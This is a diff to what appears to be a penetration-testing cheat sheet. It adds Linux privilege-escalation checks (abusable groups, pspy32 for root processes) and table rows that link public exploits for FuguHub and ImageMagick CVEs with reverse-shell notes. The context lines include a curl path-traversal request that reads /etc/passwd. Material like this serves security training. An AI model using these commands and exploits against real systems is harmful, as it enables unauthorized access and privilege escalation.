@@ -422,6 +422,7 @@ Send filename contents into target port 8000 over nc
 ## Linux - check powers
 	id
 	sudo -l
+Check for [weird groups](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html)  
 
 ## Linux - services
 	ps aux | grep root
@@ -443,6 +444,9 @@ linpeas check
 
 	grep "CRON" /var/log/syslog
 if crontab is not accessible, check logs  
+
+	./pspy32
+Run and look for any recurrent processes by UID 0  
 
 ## Linux - installed programs
 	dpkg -l
@@ -688,6 +692,8 @@ GET/POST parameters
 |Redis|<=5.0.5|???|[github](https://github.com/n0b0dyCN/redis-rogue-server/tree/master)|Shell|
 |FreeSWITCH|1.10.1||[exploitDB](https://www.exploit-db.com/exploits/47799)||
 |Cassandra Web|0.5.0||[exploitDB](https://www.exploit-db.com/exploits/49362)|`curl --path-as-is http://ip:3000/../../../../../../../../etc/passwd`|
+|FuguHub|8.4|CVE-2024-27697|[github](https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697)|Use lua one-liner in revshells|
+|ImageMagick|6.9.6-4|CVE-2023-34152|[github](https://github.com/SudoIndividual/CVE-2023-34152)|Shell will bind upon upload|
 
 
 
